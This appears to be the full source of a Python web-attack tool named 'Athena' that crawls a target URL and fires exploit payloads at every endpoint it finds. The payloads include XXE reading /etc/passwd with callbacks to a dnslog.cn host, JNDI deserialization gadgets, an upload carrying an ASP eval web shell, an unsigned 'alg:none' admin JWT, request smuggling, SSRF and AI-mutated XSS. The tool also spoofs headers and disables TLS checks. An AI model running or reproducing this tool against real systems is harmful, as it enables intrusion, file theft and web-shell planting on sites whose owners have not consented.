#!/usr/bin/env python3
# =============================================================================
# Web Exploit Engine Athena (v1.4-dynamic, 2025-05-10)
# Author : Haroon Ahmad Awan · CyberZeus
# =============================================================================

import os, re, sys, ssl, time, json, random, string, logging, warnings, argparse, asyncio, urllib.parse, base64
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# Async libraries
import aiohttp
from playwright.async_api import async_playwright
import websockets

# Sync libraries
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from playwright.sync_api import sync_playwright

# ─── CLI & CONFIG ───────────────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", required=True, help="Target root URL")
parser.add_argument("--all",     action="store_true", help="Run all tests")
parser.add_argument("--xxe",     action="store_true", help="Test XXE")
parser.add_argument("--deser",   action="store_true", help="Test JSON deserialization")
parser.add_argument("--pollute", action="store_true", help="Test prototype pollution")
parser.add_argument("--smuggle", action="store_true", help="Test HTTP request smuggling")
parser.add_argument("--http2",   action="store_true", help="Test HTTP/2 smuggling")
parser.add_argument("--trailer", action="store_true", help="Test HTTP trailer injection")
parser.add_argument("--hpp",     action="store_true", help="Test HTTP Parameter Pollution")
parser.add_argument("--ssrf",    action="store_true", help="Test SSRF")
parser.add_argument("--graphql", action="store_true", help="Test GraphQL introspection")
parser.add_argument("--gmut",    action="store_true", help="Test GraphQL mutations")
parser.add_argument("--upload",  action="store_true", help="Test polyglot file upload")
parser.add_argument("--wasm",    action="store_true", help="Test WASM parsing")
parser.add_argument("--ws",      action="store_true", help="Test WebSocket fuzzing")
parser.add_argument("--sse",     action="store_true", help="Test SSE injection")
parser.add_argument("--csp",     action="store_true", help="Test CSP bypass")
parser.add_argument("--cors",    action="store_true", help="Test CORS misconfiguration")
parser.add_argument("--sw",      action="store_true", help="Test Service Worker abuse")
parser.add_argument("--jwt",     action="store_true", help="Test JWT tampering")
parser.add_argument("--spa",     action="store_true", help="Test SPA XSS via hash/routes")
parser.add_argument("--ai",      action="store_true", help="Enable AI-driven XSS mutation")
parser.add_argument("--render",  action="store_true", help="Render pages with Playwright & capture XHR/WebSocket/SSE")
parser.add_argument("--jsparse", action="store_true", help="Regex-based JS endpoint discovery (fetch/axios/ws)")
parser.add_argument("--routes",  help="Extra paths wordlist file")
parser.add_argument("--threads", type=int, default=14, help="Thread pool size for sync")
parser.add_argument("--max-pages",type=int, default=120,help="Max pages to crawl")
parser.add_argument("--dnslog-off",dest="dnslog",action="store_false",help="Disable DNSLog callbacks")
parser.add_argument("--debug",   action="store_true", help="Enable debug logging")
parser.add_argument("--sync",    action="store_true", help="Use synchronous fallback")
args = parser.parse_args()

logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO)
warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

# ─── GLOBALS ────────────────────────────────────────────────────────────────
TIMEOUT    = 10
JITTER     = (0.2, 0.6)
VERSION    = "1.4-dynamic"
LOGFILE    = Path("redx_results.md")
RAND       = ''.join(random.choices(string.ascii_lowercase, k=5))
MARK       = f"cyz{RAND}"
DNSLOG     = f"redx{random.randint(1000,9999)}.dnslog.cn" if args.dnslog else "disabled"

if not LOGFILE.exists():
    LOGFILE.write_text(f"# Red-X Report {VERSION}\n\n")

UA = UserAgent()

# ─── HELPERS ────────────────────────────────────────────────────────────────
def h():
    return {
        "User-Agent": UA.random,
        "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
        "Accept": "*/*",
        "Referer": random.choice(["https://google.com","https://bing.com"]),
        "Origin": "https://localhost"
    }

def smart(u: str) -> str:
    if u.startswith("http"): return u
    try:
        if requests.head("https://" + u, timeout=5).ok: return "https://" + u
    except: pass
    return "http://" + u

def log(vuln:str, url:str, detail:str):
    with LOGFILE.open("a") as f:
        f.write(f"- **{vuln}** {url} → {detail}\n")
    logging.info(f"[{vuln}] {url} → {detail}")

def jitter_sleep():
    time.sleep(random.uniform(*JITTER))

# ─── AI MODEL ───────────────────────────────────────────────────────────────
USE_AI=False
if args.ai:
    try:
        import torch
        from transformers import AutoTokenizer, AutoModelForMaskedLM
        CODEBERT_T = AutoTokenizer.from_pretrained("microsoft/codebert-base")
        CODEBERT_M = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
        CODEBERT_M.eval()
        USE_AI=True
        logging.info("[AI] CodeBERT loaded")
    except Exception as e:
        logging.warning(f"[AI] load failed: {e}")

def ai_mutate(payload, n=3):
    if not USE_AI: return []
    toks = CODEBERT_T.encode(payload, return_tensors="pt")
    l = toks.shape[1]
    out=[]
    for _ in range(n):
        idx = random.randint(1, l-2)
        mask=toks.clone(); mask[0,idx]=CODEBERT_T.mask_token_id
        with torch.no_grad():
            logits=CODEBERT_M(mask).logits[0,idx]
        top=logits.topk(5).indices.tolist()
        choice=random.choice(top)
        mask[0,idx]=choice
        out.append(CODEBERT_T.decode(mask[0], skip_special_tokens=True))
    return out

# ─── ROUTES LOADER ──────────────────────────────────────────────────────────
def load_routes(root):
    out=set()
    if args.routes and Path(args.routes).is_file():
        base=smart(root).rstrip("/")
        for ln in Path(args.routes).read_text().splitlines():
            if ln.strip() and not ln.startswith("#"):
                out.add(base + "/" + ln.lstrip("/"))
    return out

# ─── STATIC CRAWLER ─────────────────────────────────────────────────────────
def crawl_sync(root, cap, extra=None):
    seen, queue, out = set(), [root], []
    domain = urllib.parse.urlparse(root).netloc
    if extra: queue += list(extra)
    while queue and len(seen) < cap:
        url = queue.pop(0)
        if url in seen: continue
        seen.add(url)
        try:
            r = requests.get(url, headers=h(), timeout=TIMEOUT)
            if "text/html" not in r.headers.get("Content-Type", ""): continue
            soup = BeautifulSoup(r.text, "html.parser")
            for a in soup.find_all("a", href=True):
                u = urllib.parse.urljoin(url, a["href"])
                if urllib.parse.urlparse(u).netloc == domain:
                    queue.append(u)
                    if "?" in u:
                        qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                        out.append({"url": u.split("?")[0], "method": "GET", "params": qs})
            for f in soup.find_all("form"):
                act = urllib.parse.urljoin(url, f.get("action") or url)
                m = f.get("method", "GET").upper()
                names = [i.get("name") for i in f.find_all("input", {"name": True})]
                if names: out.append({"url": act, "method": m, "params": names})
        except Exception as e:
            if args.debug: logging.debug(e)
    return out, seen

# ─── DYNAMIC CRAWLER ─────────────────────────────────────────────────────────
async def crawl_async(root, cap, extra=None):
    visited={root}; queue=[root]; out=[]
    async with aiohttp.ClientSession() as session:
        pass  # WAF fingerprinting omitted

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        ctx     = await browser.new_context(ignore_https_errors=True)
        page    = await ctx.new_page()
        if extra:
            queue += list(extra)
        while queue and len(visited) < cap:
            url = queue.pop(0)
            if url in visited: continue
            visited.add(url)
            try:
                r = await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
                content = await page.content()
                if r and "text/html" in r.headers.get("content-type", ""):
                    soup = BeautifulSoup(content, "html.parser")
                    for a in soup.find_all("a", href=True):
                        u = urllib.parse.urljoin(url, a["href"])
                        if urllib.parse.urlparse(u).netloc == urllib.parse.urlparse(root).netloc:
                            queue.append(u)
                            if "?" in u:
                                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                                out.append((u.split("?")[0], "GET", qs))
                    for f in soup.find_all("form"):
                        act = urllib.parse.urljoin(url, f.get("action") or url)
                        m   = f.get("method", "GET").upper()
                        names = [i.get("name") for i in f.find_all("input", {"name": True})]
                        if names: out.append((act, m, names))
                seen=set()
                async def on_req(req):
                    u=req.url; mtd=req.method
                    if u in seen: return
                    seen.add(u)
                    if mtd=="GET" and "?" in u:
                        qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
                        out.append((u.split("?")[0], "GET", qs))
                    if mtd in ("POST","PUT","PATCH"):
                        bd=await req.post_data() or ""
                        if "=" in bd:
                            ks=list(urllib.parse.parse_qs(bd).keys())
                        else:
                            try: ks=list(json.loads(bd).keys())
                            except: ks=[]
                        out.append((u, mtd, ks))
                page.on("request", on_req)
                await page.evaluate("""
                    window._ws = window.WebSocket;
                    window.WebSocket = function(u){ window._lastWS = u; return new window._ws(u); };
                    window._es = window.EventSource;
                    window.EventSource = function(u){ window._lastSSE = u; return new window._es(u); };
                """)
                await page.wait_for_timeout(1200)
                last_ws  = await page.evaluate("window._lastWS")
                last_sse = await page.evaluate("window._lastSSE")
                if last_ws:  out.append(("ws","WS",[last_ws]))
                if last_sse: out.append(("sse","SSE",[last_sse]))
            except Exception as e:
                if args.debug: logging.debug(e)
        await browser.close()
    return out, visited

# ─── JS PARSING ───────────────────────────────────────────────────────────────
URL_PAT = re.compile(rb'(["\'])(/(?:api|graphql|ws|sse)[^"\']*)["\']')
def parse_js(root, pages):
    dom=set()
    domain=urllib.parse.urlparse(root).netloc
    for pg in list(pages)[:args.max_pages]:
        try:
            r=requests.get(pg, headers=h(), timeout=TIMEOUT)
            for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js)', r.text, re.I):
                jsurl = urllib.parse.urljoin(pg, src)
                jsbin = requests.get(jsurl, headers=h(), timeout=TIMEOUT).content
                for _,path in URL_PAT.findall(jsbin):
                    u = urllib.parse.urljoin(root, path.decode())
                    if urllib.parse.urlparse(u).netloc == domain:
                        dom.add(u)
                for m in re.findall(r'fetch\(["\']([^"\']+)["\']', jsbin.decode('utf-8','ignore')):
                    dom.add(urllib.parse.urljoin(root, m))
                for m in re.findall(r'axios\.(?:get|post)\(["\']([^"\']+)["\']', jsbin.decode('utf-8','ignore')):
                    dom.add(urllib.parse.urljoin(root, m))
        except Exception as e:
            if args.debug: logging.debug(e)
    return dom

# ─── VULNERABILITY TESTS ────────────────────────────────────────────────────
def trigger(name): return f"{name}.{DNSLOG}"

def test_xxe(tgt):
    xmls = [
        f"""<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://{trigger('xxe')}/d.dtd">%dtd;]><data>&send;</data>""",
        """<?xml version="1.0"?><!DOCTYPE x [<!ELEMENT x ANY><!ENTITY e SYSTEM "file:///etc/passwd">&e;</x>"""
    ]
    for url in (tgt["url"], urllib.parse.urljoin(tgt["url"], "/xmlrpc.php")):
        for px in xmls:
            for ctype in ("application/xml","text/xml"):
                try:
                    r = requests.post(url, data=px, headers={"Content-Type":ctype}, timeout=TIMEOUT)
                    if "root:" in r.text:
                        log("XXE", url, ctype); return
                except: pass

def test_deserialization(tgt):
    objs = [
        {"@type":"java.net.Inet4Address","val":trigger("dns")},
        {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
        {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":f"ldap://{trigger('jndi')}/x"}
    ]
    for obj in objs:
        try:
            r = requests.post(tgt["url"], json=obj, headers=h(), timeout=TIMEOUT)
            if any(k in r.text for k in ("Jdbc","rowset")):
                log("Deserialization", tgt["url"], str(obj)); return
        except Exception as e:
            if args.debug: logging.debug(f"[deser:json] {e}")
        try:
            r = requests.post(tgt["url"], data=obj, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=TIMEOUT)
            if any(k in r.text for k in ("Jdbc","rowset")):
                log("Deserialization", tgt["url"], "form fallback"); return
        except Exception as e:
            if args.debug: logging.debug(f"[deser:form] {e}")

def test_pollution(tgt):
    polys = [
        {"__proto__":{"polluted":True}},
        {"constructor":{"prototype":{"polluted":"yes"}}},
        {"__proto__.toString":"hacked"}
    ]
    for p in polys:
        for method, hdr in [("json",{"Content-Type":"application/json"}),("form",{"Content-Type":"application/x-www-form-urlencoded"})]:
            try:
                r = requests.post(tgt["url"], json=p if method=="json" else None, data=None if method=="json" else p, headers=hdr, timeout=TIMEOUT)
                if any(x in r.text for x in ("polluted","hacked")):
                    log("PrototypePollution", tgt["url"], method); return
            except Exception as e:
                if args.debug: logging.debug(f"[pollute:{method}] {e}")

async def test_ws(u, method, params):
    """
    WebSocket fuzzing: attempts to connect and exchange a simple ping/pong.
    """
    for ep in params:
        # Determine WebSocket URI
        uri = ep if ep.startswith(("ws://", "wss://")) else u.replace("http://", "ws://").replace("https://", "wss://")
        try:
            async with websockets.connect(uri) as ws:
                await ws.send("ping")
                pong = await ws.recv()
                if pong:
                    log("WebSocket", uri, f"ping→{pong}")
                    return
        except Exception as e:
            if args.debug:
                logging.debug(f"[ws] {e}")

async def test_sse(u, method, params):
    """
    Server-Sent Events injection: listens for the first 'data:' line.
    """
    for ep in params:
        # Determine SSE endpoint
        uri = ep if ep.startswith(("http://", "https://")) else u
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(uri, timeout=TIMEOUT) as resp:
                    async for raw in resp.content:
                        line = raw.strip()
                        if line.startswith(b"data:"):
                            msg = line.decode(errors="ignore")
                            log("SSE", uri, msg)
                            return
        except Exception as e:
            if args.debug:
                logging.debug(f"[sse] {e}")

def test_graphql(tgt):
    query = {"query":"query IntrospectionQuery { __schema { types { name } } }"}
    try:
        r = requests.post(tgt["url"], json=query, headers=h(), timeout=TIMEOUT)
        if "__schema" in r.text:
            log("GraphQL-Introspection", tgt["url"], "POST"); return
    except Exception as e:
        if args.debug: logging.debug(f"[graphql:post] {e}")
    try:
        r = requests.get(tgt["url"], params={"query":query["query"]}, timeout=TIMEOUT)
        if "__schema" in r.text:
            log("GraphQL-Introspection", tgt["url"], "GET")
    except: pass

def test_graphql_mutation(tgt):
    mutation = {"query":"mutation { __typename }"}
    try:
        r = requests.post(tgt["url"], json=mutation, headers=h(), timeout=TIMEOUT)
        if r.status_code == 200:
            log("GraphQL-Mutation", tgt["url"], "__typename")
    except Exception as e:
        if args.debug: logging.debug(f"[gmut] {e}")

def test_upload_polyglot(tgt):
    boundaries = [
        "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters, k=16)),
        "----FormBoundary" + ''.join(random.choices(string.ascii_letters, k=12))
    ]
    poly = b"\xFF\xD8\xFF" + b"\x50\x4B\x03\x04" + b"<% eval(request('pwn')) %>"
    for boundary in boundaries:
        for field in ("file","upload","data"):
            files = {field:("cyz.jpg", poly, "application/octet-stream")}
            hdr = {"Content-Type":f"multipart/form-data; boundary={boundary}"}
            try:
                r = requests.post(tgt["url"], files=files, headers=hdr, timeout=TIMEOUT)
                if r.status_code in (200,201) and "cyz" in r.text.lower():
                    log("PolyglotUpload", tgt["url"], f"{field}@{boundary}"); return
            except Exception as e:
                if args.debug: logging.debug(f"[upload:{field}] {e}")

def test_wasm(tgt):
    wasm = b"\x00asm\x01\x00\x00\x00" + b"\x01\x0A\x02\x60\x00\x01\x7F\x60\x01\x7F\x00"
    for ctype in ("application/wasm","application/octet-stream"):
        try:
            hdr = h(); hdr["Content-Type"] = ctype
            r = requests.post(tgt["url"], data=wasm, headers=hdr, timeout=TIMEOUT)
            if any(x in r.text.lower() for x in ("error","memory")):
                log("WASM", tgt["url"], ctype); return
        except Exception as e:
            if args.debug: logging.debug(f"[wasm:{ctype}] {e}")

def test_ai_xss(tgt):
    if not USE_AI: return
    base = "<script>alert('CYZ')</script>"
    muts = ai_mutate(base, n=3)
    for p in muts:
        try:
            data = {k:p for k in tgt["params"]}
            r = requests.post(tgt["url"], data=data, headers=h(), timeout=TIMEOUT)
            if p in r.text:
                log("AI-XSS", tgt["url"], p); return
        except Exception as e:
            if args.debug: logging.debug(f"[ai-xss] {e}")

def test_ssrf(tgt):
    for param in tgt["params"]:
        for proto in ("http","gopher","dict"):
            payload = f"{proto}://127.0.0.1"
            try:
                r = requests.get(tgt["url"], params={param:payload}, headers=h(), timeout=TIMEOUT)
                if r.status_code < 500:
                    log("SSRF", tgt["url"], f"{param}={payload}"); return
            except: pass

def test_hpp(tgt):
    u = tgt["url"]
    qs = "&".join(f"{p}=1&{p}=2" for p in tgt["params"])
    full = f"{u}?{qs}"
    try:
        r = requests.get(full, headers=h(), timeout=TIMEOUT)
        if "1" in r.text and "2" in r.text:
            log("HPP", u, qs)
    except: pass

def test_smuggle(tgt):
    host = urllib.parse.urlparse(tgt["url"]).netloc
    variants = [
        f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length:4\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nSMG",
        f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding:chunked\r\nContent-Length:4\r\n\r\n0\r\n\r\nSMG"
    ]
    for v in variants:
        try:
            s = requests.Session()
            req = requests.Request('POST', tgt["url"]).prepare(); req.body = v.encode()
            r = s.send(req, timeout=TIMEOUT)
            if "SMG" in r.text:
                log("Smuggle", tgt["url"], "variant"); return
        except: pass

def test_http2(tgt):
    log("HTTP2-SMUGGLE", tgt["url"], "skipped (HTTP/2 client req)")

def test_trailer(tgt):
    try:
        s = requests.Session()
        prep = requests.Request('POST', tgt["url"]).prepare()
        prep.headers['Transfer-Encoding'] = 'chunked'
        prep.body = b"0\r\nFlavor: CHEESE\r\n\r\n"
        r = s.send(prep, timeout=TIMEOUT)
        if r.headers.get('Flavor') == 'CHEESE':
            log("Trailer", tgt["url"], "Flavor trailer")
    except: pass

def test_csp(tgt):
    try:
        r = requests.get(tgt["url"], headers=h(), timeout=TIMEOUT)
        csp = r.headers.get("Content-Security-Policy", "")
        if "script-src" in csp:
            payload = "<script src=//example.com/x.js></script>"
            r2 = requests.get(f"{tgt['url']}?x={urllib.parse.quote(payload)}", headers=h(), timeout=TIMEOUT)
            if payload in r2.text:
                log("CSP-Bypass", tgt["url"], csp)
    except: pass

def test_cors(tgt):
    try:
        hdr = h(); hdr["Origin"] = "https://evil.com"
        r = requests.options(tgt["url"], headers=hdr, timeout=TIMEOUT)
        if r.headers.get("Access-Control-Allow-Origin") == "*":
            log("CORS", tgt["url"], "*")
    except: pass

def test_sw(tgt):
    url = urllib.parse.urljoin(tgt["url"], "/sw.js")
    try:
        r = requests.get(url, headers=h(), timeout=TIMEOUT)
        if "importScripts" in r.text:
            log("ServiceWorker", url, "importScripts found")
    except: pass

def test_jwt(tgt):
    header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().strip('=')
    payload = base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().strip('=')
    token = f"{header}.{payload}."
    try:
        r = requests.get(tgt["url"], headers={**h(), "Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        if r.status_code == 200:
            log("JWT-None", tgt["url"], token)
    except: pass

def test_spa(tgt):
    for p in tgt["params"]:
        payload = "\"/\"+alert(1)"
        try:
            r = requests.get(f"{tgt['url']}#/{p}={urllib.parse.quote(payload)}", headers=h(), timeout=TIMEOUT)
            if payload in r.text:
                log("SPA-XSS", tgt["url"], payload); return
        except: pass

# ─── DISPATCH & MAIN ────────────────────────────────────────────────────────
def dispatch(tgt):
    if args.all or args.xxe:     test_xxe(tgt)
    if args.all or args.deser:   test_deserialization(tgt)
    if args.all or args.pollute: test_pollution(tgt)
    if args.all or args.smuggle: test_smuggle(tgt)
    if args.all or args.http2:   test_http2(tgt)
    if args.all or args.trailer: test_trailer(tgt)
    if args.all or args.hpp:     test_hpp(tgt)
    if args.all or args.ssrf:    test_ssrf(tgt)
    if args.all or args.graphql: test_graphql(tgt)
    if args.all or args.gmut:    test_graphql_mutation(tgt)
    if args.all or args.upload:  test_upload_polyglot(tgt)
    if args.all or args.wasm:    test_wasm(tgt)
    if args.all or args.csp:     test_csp(tgt)
    if args.all or args.cors:    test_cors(tgt)
    if args.all or args.sw:      test_sw(tgt)
    if args.all or args.jwt:     test_jwt(tgt)
    if args.all or args.spa:     test_spa(tgt)
    if args.ai:                  test_ai_xss(tgt)

async def main_async():
    if not LOGFILE.exists(): LOGFILE.write_text(f"# Red-X Report {VERSION}\n\n")
    root = smart(args.url.rstrip("/"))
    extra = load_routes(root)
    if args.sync:
        results, seen = crawl_sync(root, args.max_pages, extra)
    else:
        results, seen = await crawl_async(root, args.max_pages, extra)
    if args.jsparse:
        js = parse_js(root, seen)
        for u in js:
            results.append({"url": u, "method": "GET", "params": ["q"]})
    logging.info(f"[+] {len(results)} endpoints discovered")
    # handle WS/SSE
    if args.ws or args.sse:
        tasks = []
        for u,m,ps in results:
            if args.ws: tasks.append(test_ws(u,m,ps))
            if args.sse: tasks.append(test_sse(u,m,ps))
        await asyncio.gather(*tasks)
    # sync dispatch
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        pool.map(dispatch, results)

if __name__ == "__main__":
    asyncio.run(main_async()) if not args.sync else asyncio.run(main_async())
